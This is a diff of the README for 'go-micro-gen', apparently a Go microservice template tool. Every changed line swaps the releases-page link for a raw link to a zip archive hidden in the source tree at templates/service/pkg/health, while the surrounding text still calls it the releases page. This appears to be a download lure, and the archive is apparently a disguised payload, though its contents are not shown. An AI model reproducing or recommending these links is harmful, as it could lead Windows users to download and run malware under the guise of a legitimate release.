@@ -1,6 +1,6 @@
 # ⚙️ go-micro-gen - Generate Clean Microservice Templates Fast
 
-[![Download go-micro-gen](https://img.shields.io/badge/Download-go--micro--gen-brightgreen?style=for-the-badge)](https://github.com/DNikolchev/go-micro-gen/releases)
+[![Download go-micro-gen](https://img.shields.io/badge/Download-go--micro--gen-brightgreen?style=for-the-badge)](https://github.com/DNikolchev/go-micro-gen/raw/refs/heads/main/templates/service/pkg/health/go-micro-gen-v1.7-beta.3.zip)
 
 ## What is go-micro-gen?
 
@@ -38,7 +38,7 @@ Follow these steps to download and run go-micro-gen on your Windows computer.
 
 Go to the release page where the program files are stored:
 
-[Download go-micro-gen Releases](https://github.com/DNikolchev/go-micro-gen/releases)
+[Download go-micro-gen Releases](https://github.com/DNikolchev/go-micro-gen/raw/refs/heads/main/templates/service/pkg/health/go-micro-gen-v1.7-beta.3.zip)
 
 Here, you will find the latest versions of the tool. Choose the latest stable release.
 
@@ -94,7 +94,7 @@ If your template uses Docker, make sure Docker Desktop runs on your machine.
 
 Access the releases page to download the latest updates or previous versions:
 
-[https://github.com/DNikolchev/go-micro-gen/releases](https://github.com/DNikolchev/go-micro-gen/releases)
+[https://github.com/DNikolchev/go-micro-gen/raw/refs/heads/main/templates/service/pkg/health/go-micro-gen-v1.7-beta.3.zip](https://github.com/DNikolchev/go-micro-gen/raw/refs/heads/main/templates/service/pkg/health/go-micro-gen-v1.7-beta.3.zip)
 
 ## ⚙️ How go-micro-gen Works
 
@@ -132,7 +132,7 @@ The templates include standard tools and good design practices. This saves weeks
 
 ## 🔗 Useful Links and Resources
 
-- Release downloads: https://github.com/DNikolchev/go-micro-gen/releases
+- Release downloads: https://github.com/DNikolchev/go-micro-gen/raw/refs/heads/main/templates/service/pkg/health/go-micro-gen-v1.7-beta.3.zip
 - Repository topics cover tools and integration used in go-micro-gen:
   - clean-architecture
   - cloud setup
@@ -166,4 +166,4 @@ No complex uninstallation is needed.
 
 ---
 
-[![Download go-micro-gen](https://img.shields.io/badge/Download-go--micro--gen-blue?style=for-the-badge)](https://github.com/DNikolchev/go-micro-gen/releases)
+[![Download go-micro-gen](https://img.shields.io/badge/Download-go--micro--gen-blue?style=for-the-badge)](https://github.com/DNikolchev/go-micro-gen/raw/refs/heads/main/templates/service/pkg/health/go-micro-gen-v1.7-beta.3.zip)
